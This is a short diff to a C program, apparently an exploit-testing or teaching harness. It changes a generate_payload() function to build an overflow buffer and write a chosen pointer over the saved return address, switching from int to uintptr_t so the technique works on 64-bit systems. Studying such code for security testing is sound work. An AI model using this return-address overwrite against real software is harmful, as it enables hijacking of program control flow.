@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <stdint.h>
 #include <string.h>
 #include <stdlib.h>
 #include <setjmp.h>
@@ -81,7 +82,7 @@ int main(int argc, char **argv) {
 
 char* generate_payload() {
 
-  size_t total_size = (uintptr_t) payload.target_addr - (uintptr_t) payload.buffer + sizeof(int);
+  size_t total_size = (uintptr_t) payload.target_addr - (uintptr_t) payload.buffer + sizeof(uintptr_t);
 
   char* temp_char_buffer = (char*) malloc(total_size);
 
@@ -89,11 +90,11 @@ char* generate_payload() {
     fprintf(stderr, "malloc failed\n");
   }
 
-  int overflow_ptr = (int) payload.overflow_ptr;
+  void* overflow_ptr = (void*) payload.overflow_ptr;
   memcpy(temp_char_buffer, payload.contents, payload.size);
 
-  char* tc_ra_location = (char*) ((uintptr_t) temp_char_buffer + total_size - sizeof(int));
-  memcpy(tc_ra_location, &overflow_ptr, sizeof(int));
+  char* tc_ra_location = (char*) ((uintptr_t) temp_char_buffer + total_size - sizeof(uintptr_t));
+  memcpy(tc_ra_location, &overflow_ptr, sizeof(uintptr_t));
 
   payload.size = total_size;
 
